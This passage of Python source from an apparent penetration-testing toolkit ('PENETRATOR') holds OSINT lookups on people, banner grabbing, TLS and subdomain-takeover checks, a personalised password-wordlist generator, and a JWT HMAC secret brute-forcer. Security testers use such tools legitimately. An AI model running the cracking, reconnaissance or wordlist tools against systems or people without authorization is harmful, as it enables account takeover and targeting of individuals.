def read_exif(path: str, log: Logger) -> dict:
    try:
        from PIL import Image, ExifTags
    except ImportError:
        log("[-] Pillow not installed. Run: pip install Pillow", "err")
        return {}
    p = Path(path)
    if not p.is_file():
        log(f"[-] File not found: {path}", "err")
        return {}
    try:
        img = Image.open(p)
        raw = img._getexif() or {}
    except Exception as exc:
        log(f"[-] {exc}", "err")
        return {}
    out: dict[str, str] = {}
    for tag_id, value in raw.items():
        name = ExifTags.TAGS.get(tag_id, str(tag_id))
        if isinstance(value, bytes): value = value[:200]
        out[name] = str(value)
        log(f"  {name:<22} {value}", "info")
    if not out:
        log("[!] No EXIF metadata", "warn")
    return out


def identify_magic(path: str, log: Logger) -> str | None:
    p = Path(path)
    if not p.is_file():
        log(f"[-] File not found: {path}", "err")
        return None
    header = p.read_bytes()[:32]
    for signature, name in MAGIC_SIGNATURES:
        if header.startswith(signature):
            log(f"[+] {name}", "ok")
            return name
    log("[!] Unknown file signature", "warn")
    log("  First 32 bytes: " + " ".join(f"{b:02x}" for b in header), "muted")
    return None


def compare_files(a: str, b: str, log: Logger) -> dict:
    pa, pb = Path(a), Path(b)
    if not pa.is_file() or not pb.is_file():
        log("[-] One or both files not found", "err")
        return {}
    da, db = pa.read_bytes(), pb.read_bytes()
    if da == db:
        log("[+] Files are identical", "ok")
        return {"identical": True, "size_a": len(da), "size_b": len(db)}
    off = None
    for i in range(min(len(da), len(db))):
        if da[i] != db[i]:
            off = i; break
    if off is None:
        off = min(len(da), len(db))
    log(f"[!] Differ at offset 0x{off:x}   sizes: {len(da):,} vs {len(db):,}", "warn")
    return {"identical": False, "offset": off, "size_a": len(da), "size_b": len(db)}


# ---------------------------------------------------------------------------
# OSINT
# ---------------------------------------------------------------------------
def verify_email(email: str, log: Logger) -> dict:
    m = EMAIL_REGEX.match(email.strip())
    if not m:
        log("[-] Invalid email syntax", "err")
        return {"valid": False}
    log("[+] Syntax valid", "ok")
    domain = m.group(1)
    out: dict = {"valid": True, "domain": domain, "mx": []}
    try:
        import dns.resolver  # type: ignore
        answers = dns.resolver.resolve(domain, "MX", lifetime=5)
        for rdata in answers:
            out["mx"].append(str(rdata))
            log(f"  MX  {rdata}", "info")
    except ImportError:
        log("[!] dnspython not installed", "warn")
    except Exception:
        log("[!] No MX records found", "warn")
    return out


def ip_geolocate(target: str, log: Logger) -> dict:
    import requests
    try:
        resp = requests.get(f"http://ip-api.com/json/{target}", timeout=8)
        data = resp.json()
    except Exception as exc:
        log(f"[-] {exc}", "err")
        return {}
    if data.get("status") != "success":
        log(f"[-] {data.get('message', 'lookup failed')}", "err")
        return {}
    for key in ("query", "country", "regionName", "city", "zip", "lat",
                "lon", "timezone", "isp", "org", "as"):
        if data.get(key):
            log(f"  {key:<12} {data[key]}", "info")
    return data


def username_search(username: str, log: Logger) -> list[tuple[str, str, int]]:
    import requests
    sess = requests.Session()
    sess.headers.update({
        "User-Agent": "Mozilla/5.0 (PENETRATOR/1.0)",
        "Accept-Language": "en-US,en;q=0.9",
    })

    def probe(site: str, tmpl: str) -> tuple[str, str, int]:
        url = tmpl.format(u=username)
        try:
            r = sess.get(url, timeout=8, allow_redirects=True)
            return site, url, r.status_code
        except requests.RequestException:
            return site, url, 0

    log(f"[*] Checking {username} on {len(USERNAME_SITES)} sites", "cyan")
    rows: list[tuple[str, str, int]] = []
    with ThreadPoolExecutor(max_workers=10) as pool:
        for fut in as_completed(pool.submit(probe, site, tmpl) for site, tmpl in USERNAME_SITES.items()):
            site, url, code = fut.result()
            rows.append((site, url, code))
            tag = "ok" if code == 200 else ("muted" if code == 404 else "warn" if code else "err")
            log(f"  [{code or '---'}] {site:<15} {url}", tag)
    return rows


def phone_info(number: str, log: Logger) -> dict:
    try:
        import phonenumbers
        from phonenumbers import carrier, geocoder, timezone
    except ImportError:
        log("[-] phonenumbers not installed. Run: pip install phonenumbers", "err")
        return {}
    try:
        parsed = phonenumbers.parse(number, None)
    except Exception as exc:
        log(f"[-] {exc}", "err")
        return {}
    out = {
        "valid": phonenumbers.is_valid_number(parsed),
        "possible": phonenumbers.is_possible_number(parsed),
        "country_code": parsed.country_code,
        "region": geocoder.description_for_number(parsed, "en"),
        "carrier": carrier.name_for_number(parsed, "en"),
        "timezones": list(timezone.time_zones_for_number(parsed)),
        "e164": phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.E164),
    }
    for k, v in out.items():
        log(f"  {k:<14} {v}", "info")
    return out


def reverse_dns(ip: str, log: Logger) -> tuple[str, list[str], list[str]] | None:
    try:
        name, aliases, addrs = socket.gethostbyaddr(ip)
    except socket.herror as exc:
        log(f"[-] {exc}", "err")
        return None
    log(f"[+] Hostname: {name}", "ok")
    if aliases:
        log(f"  Aliases:  {', '.join(aliases)}", "info")
    log(f"  Addresses:  {', '.join(addrs)}", "info")
    return name, aliases, addrs


# ---------------------------------------------------------------------------
# Wordlist generation
# ---------------------------------------------------------------------------
def cupp_wordlist(values: dict[str, str]) -> set[str]:
    base = {v.strip() for v in values.values() if v.strip() and v.strip() != values.get("birthday", "")}
    birthday = values.get("birthday", "").strip()
    base |= {v.strip() for v in (values.get("keywords", "").split(",")) if v.strip()}
    cased: set[str] = set()
    for w in base:
        cased |= {w, w.lower(), w.upper(), w.capitalize()}
    combined = set(cased)
    for a, b in itertools.permutations(cased, 2):
        combined.add(a + b)
    suffixes = ["", "1", "12", "123", "1234", "!", "!!", "!@#"] + [str(y) for y in range(1960, 2031)]
    if birthday:
        if len(birthday) >= 4:
            suffixes += [birthday, birthday[-4:], birthday[-2:]]
    final = set(combined)
    for w in combined:
        for s in suffixes:
            final.add(w + s)
    return final


def combinator(left: list[str], right: list[str]) -> set[str]:
    return {a + b for a in left for b in right}


def leet_mutate(words: list[str], per_word: int = 30) -> set[str]:
    out: set[str] = set()
    for word in words:
        positions = [LEET_MAP.get(ch.lower(), [ch]) for ch in word]
        for i, combo in enumerate(itertools.product(*positions)):
            if i >= per_word:
                break
            out.add("".join(combo))
    return out


def pattern_generate(charset: str, min_len: int, max_len: int) -> Iterable[str]:
    for length in range(min_len, max_len + 1):
        for combo in itertools.product(charset, repeat=length):
            yield "".join(combo)


# ---------------------------------------------------------------------------
# crt.sh — Certificate Transparency subdomain enumeration
# ---------------------------------------------------------------------------
def crtsh_subdomains(domain: str, log: Logger) -> list[str]:
    """Query Certificate Transparency logs via crt.sh for SAN entries."""
    import requests
    url = f"https://crt.sh/?q=%25.{domain}&output=json"
    log(f"[*] Querying crt.sh for *.{domain}", "cyan")
    try:
        resp = requests.get(url, timeout=30,
                            headers={"User-Agent": "PENETRATOR/1.0"})
    except requests.RequestException as exc:
        log(f"[-] {exc}", "err")
        return []
    if resp.status_code != 200:
        log(f"[-] crt.sh returned HTTP {resp.status_code}", "err")
        return []
    try:
        records = resp.json()
    except ValueError:
        log("[-] crt.sh returned non-JSON (rate limited?)", "err")
        return []
    found: set[str] = set()
    for rec in records:
        for name in (rec.get("name_value") or "").splitlines():
            name = name.strip().lower().lstrip("*.")
            if name and name.endswith(domain) and " " not in name:
                found.add(name)
    sorted_names = sorted(found)
    for name in sorted_names:
        log(f"  + {name}", "ok")
    log(f"[*] {len(sorted_names)} unique subdomain(s) from CT logs", "cyan")
    return sorted_names


# ---------------------------------------------------------------------------
# Banner grabbing
# ---------------------------------------------------------------------------
def grab_banner(host: str, port: int, timeout: float, log: Logger) -> str:
    """Connect to host:port, send a probe, and return the first response chunk."""
    import socket as _s
    probes = {
        80: b"HEAD / HTTP/1.0\r\n\r\n",
        8080: b"HEAD / HTTP/1.0\r\n\r\n",
        443: b"",  # TLS — handled separately below
        21: b"", 22: b"", 25: b"HELP\r\n", 110: b"QUIT\r\n",
        143: b"a001 LOGOUT\r\n", 3306: b"\x00",
    }
    try:
        with _s.socket(_s.AF_INET, _s.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            sock.connect((host, port))
            probe = probes.get(port, b"")
            if probe:
                sock.sendall(probe)
            data = sock.recv(2048)
    except OSError as exc:
        log(f"  [{port}] {exc}", "muted")
        return ""
    text = data.decode("utf-8", errors="replace").strip()
    if text:
        first_lines = "\n".join(text.splitlines()[:3])
        log(f"[+] {host}:{port}", "ok")
        for line in first_lines.splitlines():
            log(f"    {line}", "info")
    else:
        log(f"  [{port}] no banner", "muted")
    return text


def scan_with_banners(target: str, start: int, end: int, threads: int,
                      timeout: float, log: Logger) -> dict[int, str]:
    """Port scan + banner grab on each open port."""
    open_ports = scan_ports(target, start, end, threads, timeout, log)
    if not open_ports:
        return {}
    log("[*] Grabbing banners...", "cyan")
    banners: dict[int, str] = {}
    for p in open_ports:
        banners[p] = grab_banner(target, p, timeout * 2, log)
    return banners


# ---------------------------------------------------------------------------
# TLS / SSL scanner
# ---------------------------------------------------------------------------
def tls_scan(host: str, port: int, log: Logger) -> dict:
    """Inspect cert chain, expiry, supported TLS versions and weak protocols."""
    import socket as _s
    import ssl
    from datetime import datetime, timezone

    out: dict = {"host": host, "port": port}
    log(f"[*] TLS scan {host}:{port}", "cyan")

    # 1. Cert info via default context
    try:
        ctx = ssl.create_default_context()
        with _s.create_connection((host, port), timeout=8) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert()
                cipher = ssock.cipher()
                version = ssock.version()
    except Exception as exc:
        log(f"[-] TLS handshake failed: {exc}", "err")
        return out

    out["tls_version"] = version
    out["cipher"] = cipher
    log(f"[+] Negotiated: {version}  cipher={cipher[0] if cipher else '?'}", "ok")

    # 2. Subject / Issuer / SANs
    subject = dict(x[0] for x in cert.get("subject", []))
    issuer = dict(x[0] for x in cert.get("issuer", []))
    sans = [v for k, v in cert.get("subjectAltName", []) if k == "DNS"]
    out["subject_cn"] = subject.get("commonName")
    out["issuer_cn"] = issuer.get("commonName")
    out["sans"] = sans
    log(f"  Subject CN  {out['subject_cn']}", "info")
    log(f"  Issuer  CN  {out['issuer_cn']}", "info")
    if sans:
        log(f"  SANs        {', '.join(sans[:8])}"
            + (f" (+{len(sans) - 8} more)" if len(sans) > 8 else ""), "info")

    # 3. Validity window
    try:
        not_after = datetime.strptime(cert["notAfter"], "%b %d %H:%M:%S %Y %Z")
        not_after = not_after.replace(tzinfo=timezone.utc)
        days_left = (not_after - datetime.now(timezone.utc)).days
        out["expires"] = cert["notAfter"]
        out["days_left"] = days_left
        tag = "ok" if days_left > 30 else "warn" if days_left > 0 else "err"
        log(f"  Expires     {cert['notAfter']}  ({days_left} days)", tag)
    except (KeyError, ValueError):
        pass

    # 4. Probe legacy protocols (TLS 1.0 / 1.1 / SSLv3)
    legacy_versions = [
        ("SSLv3",    getattr(ssl, "PROTOCOL_SSLv23", None), getattr(ssl.TLSVersion, "SSLv3", None)),
        ("TLSv1.0",  None, ssl.TLSVersion.TLSv1),
        ("TLSv1.1",  None, ssl.TLSVersion.TLSv1_1),
    ]
    legacy_supported: list[str] = []
    for name, _, tlsver in legacy_versions:
        if tlsver is None:
            continue
        try:
            ctx2 = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx2.check_hostname = False
            ctx2.verify_mode = ssl.CERT_NONE
            ctx2.minimum_version = tlsver
            ctx2.maximum_version = tlsver
            with _s.create_connection((host, port), timeout=4) as s2:
                with ctx2.wrap_socket(s2, server_hostname=host):
                    legacy_supported.append(name)
        except Exception:
            pass
    out["legacy_supported"] = legacy_supported
    if legacy_supported:
        log(f"[!] Legacy protocols supported: {', '.join(legacy_supported)}", "warn")
    else:
        log("[+] No legacy protocols (SSLv3/TLS1.0/TLS1.1) accepted", "ok")
    return out


# ---------------------------------------------------------------------------
# JWT toolkit
# ---------------------------------------------------------------------------
def _b64url_decode(data: str) -> bytes:
    pad = "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data + pad)


def jwt_decode(token: str, log: Logger) -> dict:
    """Decode and pretty-print a JWT. Does NOT verify signature."""
    import json as _json
    parts = token.strip().split(".")
    if len(parts) != 3:
        log("[-] Not a JWT (need 3 dot-separated parts)", "err")
        return {}
    try:
        header = _json.loads(_b64url_decode(parts[0]))
        payload = _json.loads(_b64url_decode(parts[1]))
    except Exception as exc:
        log(f"[-] Decode failed: {exc}", "err")
        return {}
    out = {"header": header, "payload": payload, "signature_b64": parts[2]}

    log("[+] Header:", "ok")
    for k, v in header.items():
        log(f"    {k}: {v}", "info")
    log("[+] Payload:", "ok")
    for k, v in payload.items():
        log(f"    {k}: {v}", "info")
    log(f"[+] Signature (b64): {parts[2][:50]}{'...' if len(parts[2]) > 50 else ''}", "ok")

    alg = header.get("alg", "").lower()
    if alg == "none":
        log("[!] alg='none' — token can be forged trivially", "warn")
    if alg.startswith("hs"):
        log(f"[i] HMAC algorithm ({alg.upper()}). Try jwt_brute() with a wordlist.",
            "muted")
    return out


def jwt_brute(token: str, wordlist_path: str, log: Logger) -> str | None:
    """Brute-force the HS256/384/512 secret from a wordlist."""
    import hmac as _hmac
    import json as _json
    parts = token.strip().split(".")
    if len(parts) != 3:
        log("[-] Not a JWT", "err"); return None
    try:
        header = _json.loads(_b64url_decode(parts[0]))
    except Exception as exc:
        log(f"[-] Decode failed: {exc}", "err"); return None
    alg = (header.get("alg") or "").upper()
    digest = {"HS256": "sha256", "HS384": "sha384", "HS512": "sha512"}.get(alg)
    if digest is None:
        log(f"[-] Unsupported alg: {alg!r} (need HS256/384/512)", "err")
        return None

    signing_input = (parts[0] + "." + parts[1]).encode()
    expected = _b64url_decode(parts[2])

    path = Path(wordlist_path)
    if not path.is_file():
        log(f"[-] Wordlist not found: {wordlist_path}", "err"); return None

    log(f"[*] Brute-forcing {alg} signature with {path}", "cyan")
    tried = 0; t0 = time.time()
    with path.open("r", encoding="utf-8", errors="ignore") as fh:
        for line in fh:
            if _should_stop():
                log("[!] Stop requested - aborting", "warn")
                return None
            secret = line.rstrip("\r\n")
            if not secret:
                continue
            tried += 1
            mac = _hmac.new(secret.encode(), signing_input, digest).digest()
            if _hmac.compare_digest(mac, expected):
                log(f"[+] Secret found after {tried} attempts: {secret!r}", "ok")
                return secret
            if tried % 20000 == 0:
                log(f"    ... tried {tried:,}", "muted")
    log(f"[-] Not found ({tried:,} tried in {time.time() - t0:.2f}s)", "warn")
    return None


# ---------------------------------------------------------------------------
# HIBP — Pwned Password check (k-anonymity API, no key required)
# ---------------------------------------------------------------------------
def hibp_password_check(password: str, log: Logger) -> int:
    """Returns occurrence count in HIBP corpus (0 = not pwned)."""
    import requests
    sha1 = hashlib.sha1(password.encode("utf-8")).hexdigest().upper()
    prefix, suffix = sha1[:5], sha1[5:]
    log(f"[*] Querying HIBP range API for SHA-1 prefix {prefix}", "cyan")
    try:
        resp = requests.get(
            f"https://api.pwnedpasswords.com/range/{prefix}",
            headers={"User-Agent": "PENETRATOR/1.0",
                     "Add-Padding": "true"},
            timeout=10,
        )
    except requests.RequestException as exc:
        log(f"[-] {exc}", "err"); return -1
    if resp.status_code != 200:
        log(f"[-] HIBP HTTP {resp.status_code}", "err"); return -1
    for line in resp.text.splitlines():
        if ":" not in line:
            continue
        suf, count = line.split(":", 1)
        if suf.strip().upper() == suffix:
            n = int(count.strip())
            log(f"[!] PWNED — seen {n:,} times in known breaches", "err")
            return n
    log("[+] Not found in HIBP — but absence is not a guarantee", "ok")
    return 0


# ---------------------------------------------------------------------------
# Subdomain takeover detector
# ---------------------------------------------------------------------------
TAKEOVER_FINGERPRINTS: list[tuple[str, str, str]] = [
    # service, cname-suffix, body-fingerprint
    ("AWS S3",          "s3.amazonaws.com",          "NoSuchBucket"),
    ("AWS S3",          "s3-website",                "NoSuchBucket"),
    ("GitHub Pages",    "github.io",                 "There isn't a GitHub Pages site here"),
    ("Heroku",          "herokudns.com",             "No such app"),
    ("Heroku",          "herokuapp.com",             "No such app"),
    ("Azure",           "azurewebsites.net",         "404 Web Site not found"),
    ("Azure",           "cloudapp.net",              "404 Web Site not found"),
    ("Azure CDN",       "azureedge.net",             "Web Site not found"),
    ("Fastly",          "fastly.net",                "Fastly error: unknown domain"),
    ("Shopify",         "myshopify.com",             "Sorry, this shop is currently unavailable"),
    ("Tumblr",          "domains.tumblr.com",        "Whatever you were looking for doesn't currently exist"),
    ("Bitbucket",       "bitbucket.io",              "Repository not found"),
    ("Cargo",           "cargocollective.com",       "404 Not Found"),
    ("Pantheon",        "pantheonsite.io",           "The gods are wise"),
    ("Surge",           "surge.sh",                  "project not found"),
    ("Read the Docs",   "readthedocs.io",            "unknown to Read the Docs"),
    ("Unbounce",        "unbouncepages.com",         "The requested URL was not found"),
    ("Zendesk",         "zendesk.com",               "Help Center Closed"),
]


def check_subdomain_takeover(host: str, log: Logger) -> dict:
    """For a given host, resolve CNAME and HTTP body, look for takeover fingerprint."""
    import requests
    out: dict = {"host": host, "cname": None, "vulnerable": False, "service": None}
    try:
        import dns.resolver
        try:
            answers = dns.resolver.resolve(host, "CNAME", lifetime=5)
            cname = str(answers[0]).rstrip(".")
            out["cname"] = cname
            log(f"  CNAME -> {cname}", "info")
        except Exception:
            log("  no CNAME", "muted")
    except ImportError:
        log("[-] dnspython not installed", "err"); return out

    try:
        resp = requests.get(f"http://{host}", timeout=8, allow_redirects=True,
                            headers={"User-Agent": "PENETRATOR/1.0"})
        body = resp.text
    except requests.RequestException as exc:
        log(f"  HTTP error: {exc}", "muted")
        body = ""

    cname = (out.get("cname") or "").lower()
    for service, suffix, fingerprint in TAKEOVER_FINGERPRINTS:
        if suffix in cname and fingerprint.lower() in body.lower():
            out["vulnerable"] = True
            out["service"] = service
            log(f"[!] LIKELY TAKEOVER on {host} ({service})", "err")
            return out
    if not out["vulnerable"]:
        log(f"[+] {host} — no takeover fingerprint matched", "ok")
    return out


# ---------------------------------------------------------------------------
# HTTP Repeater — send a raw HTTP request, return the response
# ---------------------------------------------------------------------------
def http_repeat(method: str, url: str, headers_text: str, body: str,
                log: Logger) -> dict:
    """Send one HTTP request; print the response status + headers + body preview."""
    import requests
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    headers: dict[str, str] = {"User-Agent": "PENETRATOR/1.0"}
    for line in (headers_text or "").splitlines():
        line = line.strip()
        if not line or ":" not in line:
            continue
        k, v = line.split(":", 1)
        headers[k.strip()] = v.strip()

    method = (method or "GET").upper()
    log(f"[*] {method} {url}", "cyan")
    try:
        resp = requests.request(
            method, url, headers=headers,
            data=body.encode("utf-8") if body else None,
            timeout=15, allow_redirects=False,
        )
    except requests.RequestException as exc:
        log(f"[-] {exc}", "err"); return {}

    log(f"[+] HTTP {resp.status_code}  {resp.reason}", "ok")
    log(f"  ─── Response headers ───", "muted")
    for k, v in resp.headers.items():
        log(f"  {k}: {v}", "info")
    log(f"  ─── Body ({len(resp.content)} bytes) ───", "muted")
    text = resp.text
    preview = "\n".join(text.splitlines()[:80])
    for line in preview.splitlines():
        log(f"  {line}", "info")
    if len(text.splitlines()) > 80:
        log(f"  ... +{len(text.splitlines()) - 80} more lines", "muted")
    return {
        "status": resp.status_code, "reason": resp.reason,
        "headers": dict(resp.headers), "body": text,
    }
